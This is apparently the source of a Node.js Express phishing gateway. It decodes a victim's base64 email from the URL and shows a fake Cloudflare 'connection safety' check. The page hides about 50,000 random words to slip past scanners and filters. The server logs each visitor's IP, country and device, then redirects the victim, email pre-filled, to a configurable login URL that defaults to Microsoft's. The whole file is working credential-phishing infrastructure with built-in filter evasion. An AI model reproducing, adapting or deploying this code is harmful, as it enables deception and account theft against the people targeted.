const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Load wordbank for background stories
let words = [];
try {
    const filePath = path.join(__dirname, 'wordbank.txt');
    if (fs.existsSync(filePath)) {
        words = fs.readFileSync(filePath, 'utf-8')
            .split(/\r?\n/)
            .map(line => line.trim())
            .filter(line => line.length > 0);
    }
} catch (err) {
    console.error('Failed to load wordbank.txt:', err);
}

// Generate background story to feed bots / filters
function generateHiddenStory() {
    if (words.length === 0) return '';
    let output = '<div style="display:none" id="story">\n';
    let wordCount = 0;
    const maxWords = 50000;
    
    while (wordCount < maxWords) {
        const sentenceLength = Math.floor(Math.random() * 9) + 8;
        const sentenceWords = [];
        for (let i = 0; i < sentenceLength; i++) {
            const randomWord = words[Math.floor(Math.random() * words.length)];
            sentenceWords.push(randomWord);
        }
        let sentence = sentenceWords.join(' ');
        sentence = sentence.charAt(0).toUpperCase() + sentence.slice(1) + '.';
        output += `<p>${sentence}</p>\n`;
        wordCount += sentenceWords.length;
    }
    output += '</div>\n';
    return output;
}

// Helper: Extract client IP
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return req.socket.remoteAddress || '0.0.0.0';
}

// Helper: Geolocate IP
async function lookupCountry(ip) {
    try {
        const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 3000 });
        return res.data?.country || 'Unknown';
    } catch (err) {
        return 'Unknown';
    }
}

// Helper: Detect Mobile/PC
function detectDeviceType(ua) {
    if (!ua) return 'PC';
    const lowercaseUa = ua.toLowerCase();
    const mobileKeywords = ['mobile', 'android', 'iphone', 'ipad', 'tablet', 'opera mini', 'iemobile'];
    for (const keyword of mobileKeywords) {
        if (lowercaseUa.includes(keyword)) return 'Mobile';
    }
    return 'PC';
}

// Logger: visitor logging
const logPath = path.join(__dirname, 'visitors.log');
function logVisitor(ip, ua, country, device) {
    try {
        let entries = {};
        if (fs.existsSync(logPath)) {
            const fileContent = fs.readFileSync(logPath, 'utf-8');
            const lines = fileContent.split(/\r?\n/).filter(line => line.trim().length > 0);
            for (const line of lines) {
                const parts = line.split(' | ');
                if (parts.length >= 5) {
                    entries[parts[0]] = {
                        ua: parts[1],
                        country: parts[2],
                        device: parts[3],
                        count: parseInt(parts[4], 10)
                    };
                }
            }
        }
        
        if (!entries[ip]) {
            entries[ip] = { ua, country, device, count: 0 };
        }
        entries[ip].count++;
        
        let output = '';
        for (const [key, val] of Object.entries(entries)) {
            output += `${key} | ${val.ua} | ${val.country} | ${val.device} | ${val.count}\n`;
        }
        fs.writeFileSync(logPath, output, 'utf-8');
    } catch (err) {
        console.error('Failed to log visitor:', err);
    }
}

// Helper: Extract and decode email from URL path
function extractEmailFromUrl(urlPath) {
    const decodedPath = decodeURIComponent(urlPath);
    const segments = decodedPath.split('/').filter(Boolean);
    
    for (let i = segments.length - 1; i >= 0; i--) {
        let segment = segments[i].trim();
        if (segment.startsWith('$(') && segment.endsWith(')')) {
            segment = segment.substring(2, segment.length - 1);
        }
        
        // Normalize base64
        let normalized = segment.replace(/-/g, '+').replace(/_/g, '/');
        const padding = normalized.length % 4;
        if (padding > 0) {
            normalized += '='.repeat(4 - padding);
        }
        
        try {
            const decoded = Buffer.from(normalized, 'base64').toString('utf8');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (emailRegex.test(decoded)) {
                return { emailB64: segment, decodedEmail: decoded };
            }
        } catch (e) {
            // Ignore decoding errors
        }
    }
    return null;
}

// POST: Verify Turnstile Token and generate redirect
app.post('/verify', async (req, res) => {
    const { token, emailB64 } = req.body;
    
    if (!token || !emailB64) {
        return res.status(400).json({ status: 'error', message: 'Missing token or email parameters.' });
    }
    
    const emailInfo = extractEmailFromUrl(emailB64);
    if (!emailInfo) {
        return res.status(400).json({ status: 'error', message: 'Invalid secure context in email parameters.' });
    }
    
    const clientIp = getClientIp(req);
    
    try {
        const response = await axios.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            new URLSearchParams({
                secret: process.env.TURNSTILE_SECRET_KEY,
                response: token,
                remoteip: clientIp
            }),
            { timeout: 5000 }
        );
        
        const result = response.data;
        if (result.success) {
            const decodedEmail = emailInfo.decodedEmail;
            const ua = req.headers['user-agent'] || '';
            const country = await lookupCountry(clientIp);
            const device = detectDeviceType(ua);
            
            logVisitor(clientIp, ua, country, device);
            
            // Build the success redirect URL, attaching the email parameter
            const baseUrl = process.env.REDIRECT_BASE_URL || 'https://login.microsoftonline.com';
            const urlObj = new URL(baseUrl);
            urlObj.searchParams.set('email', decodedEmail);
            
            return res.json({
                status: 'success',
                email: decodedEmail,
                redirectUrl: urlObj.toString()
            });
        } else {
            return res.status(403).json({
                status: 'error',
                message: 'Turnstile verification failed.',
                'error-codes': result['error-codes'] || []
            });
        }
    } catch (err) {
        console.error('Verification Error:', err);
        return res.status(500).json({ status: 'error', message: 'Server verification processing failed.' });
    }
});

// GET: All other paths (matches :emailB64)
app.get('*', async (req, res) => {
    if (req.path === '/favicon.ico') {
        return res.status(204).end();
    }
    
    const emailInfo = extractEmailFromUrl(req.path);
    if (!emailInfo) {
        return res.status(400).send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>Access Denied</title>
                <style>
                    body { background: #0b0c10; color: #f5f5f7; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                    .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); padding: 40px; border-radius: 20px; text-align: center; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h2>Access Denied</h2>
                    <p>Security context could not be extracted from URL path.</p>
                </div>
            </body>
            </html>
        `);
    }
    
    const storiesHtml = generateHiddenStory();
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Connecting securely...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
            <style>
                :root {
                    --bg-color: #0b0c10;
                    --card-bg: rgba(255, 255, 255, 0.02);
                    --border-color: rgba(255, 255, 255, 0.08);
                    --text-color: #f5f5f7;
                    --text-muted: #86868b;
                    --accent-color: #0071e3;
                    --success-color: #34c759;
                    --error-color: #ff3b30;
                }

                body {
                    margin: 0;
                    padding: 0;
                    height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background-color: var(--bg-color);
                    background-image: 
                        radial-gradient(circle at 15% 15%, rgba(0, 113, 227, 0.12) 0%, transparent 45%),
                        radial-gradient(circle at 85% 85%, rgba(255, 255, 255, 0.02) 0%, transparent 45%);
                    font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
                    color: var(--text-color);
                    overflow: hidden;
                }

                .loader-card {
                    background: var(--card-bg);
                    backdrop-filter: blur(30px);
                    -webkit-backdrop-filter: blur(30px);
                    border: 1px solid var(--border-color);
                    border-radius: 28px;
                    padding: 50px 30px;
                    width: 100%;
                    max-width: 380px;
                    text-align: center;
                    box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
                    transform: scale(0.96);
                    opacity: 0;
                    animation: scaleIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
                    z-index: 10;
                }

                @keyframes scaleIn {
                    to {
                        transform: scale(1);
                        opacity: 1;
                    }
                }

                .sec-container {
                    margin-bottom: 30px;
                    display: flex;
                    justify-content: center;
                }

                .pulse-ring {
                    width: 84px;
                    height: 84px;
                    border-radius: 50%;
                    border: 2px solid var(--accent-color);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    position: relative;
                    animation: pulse 2s infinite ease-in-out;
                    transition: border-color 0.5s ease, box-shadow 0.5s ease;
                }

                @keyframes pulse {
                    0% {
                        box-shadow: 0 0 0 0 rgba(0, 113, 227, 0.3);
                    }
                    70% {
                        box-shadow: 0 0 0 20px rgba(0, 113, 227, 0);
                    }
                    100% {
                        box-shadow: 0 0 0 0 rgba(0, 113, 227, 0);
                    }
                }

                h1 {
                    font-size: 1.35rem;
                    font-weight: 600;
                    margin: 0 0 10px 0;
                    letter-spacing: -0.3px;
                    transition: color 0.5s ease;
                }

                p {
                    font-size: 0.9rem;
                    color: var(--text-muted);
                    margin: 0;
                    line-height: 1.5;
                }

                .cf-turnstile-container {
                    display: none;
                }

                .footer-info {
                    font-size: 0.75rem;
                    color: rgba(255, 255, 255, 0.25);
                    margin-top: 40px;
                }
            </style>
            <!-- Cloudflare Turnstile API -->
            <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
        </head>
        <body>
            <div class="loader-card">
                <div class="sec-container">
                    <div class="pulse-ring" id="pulse-ring">
                        <svg id="shield-icon" viewBox="0 0 24 24" width="36" height="36" fill="#0071e3" style="transition: fill 0.5s ease;">
                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                        </svg>
                    </div>
                </div>
                <h1 id="status-title">Checking connection safety</h1>
                <p id="status-subtitle">Verifying your browser integrity. Please wait...</p>
                
                <!-- Hidden Turnstile Widget Container -->
                <div class="cf-turnstile-container">
                    <div id="turnstile-widget"></div>
                </div>

                <div class="footer-info">
                    Protected by Cloudflare Turnstile.
                </div>
            </div>

            <!-- Background Random Stories to feed filters/scrapers -->
            ${storiesHtml}

            <script>
                window.onloadTurnstileCallback = function () {
                    turnstile.render('#turnstile-widget', {
                        sitekey: ${JSON.stringify(process.env.TURNSTILE_SITE_KEY)},
                        callback: function(token) {
                            // POST token and base64 email to the server
                            fetch('/verify', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    token: token,
                                    emailB64: ${JSON.stringify(emailInfo.emailB64)}
                                })
                            })
                            .then(res => {
                                if (!res.ok) {
                                    return res.json().then(err => { throw err; });
                                }
                                return res.json();
                            })
                            .then(data => {
                                if (data.status === 'success' && data.redirectUrl) {
                                    // Success state animation
                                    const ring = document.getElementById('pulse-ring');
                                    const shield = document.getElementById('shield-icon');
                                    
                                    ring.style.borderColor = 'var(--success-color)';
                                    ring.style.animation = 'none';
                                    ring.style.boxShadow = '0 0 20px rgba(52, 199, 89, 0.2)';
                                    shield.style.fill = 'var(--success-color)';
                                    
                                    document.getElementById('status-title').textContent = 'Secure Connection Established';
                                    document.getElementById('status-title').style.color = 'var(--success-color)';
                                    document.getElementById('status-subtitle').textContent = 'Redirecting to workspace...';
                                    
                                    setTimeout(() => {
                                        window.location.href = data.redirectUrl;
                                    }, 800);
                                } else {
                                    throw new Error('Verification failed');
                                }
                            })
                            .catch(err => {
                                showError(err.message || 'Unable to establish secure connection.');
                            });
                        },
                        'error-callback': function() {
                            showError('Turnstile challenge failed. Please refresh.');
                        },
                        size: 'invisible'
                    });
                };

                function showError(msg) {
                    const ring = document.getElementById('pulse-ring');
                    const shield = document.getElementById('shield-icon');
                    
                    ring.style.borderColor = 'var(--error-color)';
                    ring.style.animation = 'none';
                    ring.style.boxShadow = '0 0 20px rgba(255, 59, 48, 0.2)';
                    shield.style.fill = 'var(--error-color)';
                    
                    document.getElementById('status-title').textContent = 'Connection Rejected';
                    document.getElementById('status-title').style.color = 'var(--error-color)';
                    document.getElementById('status-subtitle').textContent = msg;
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
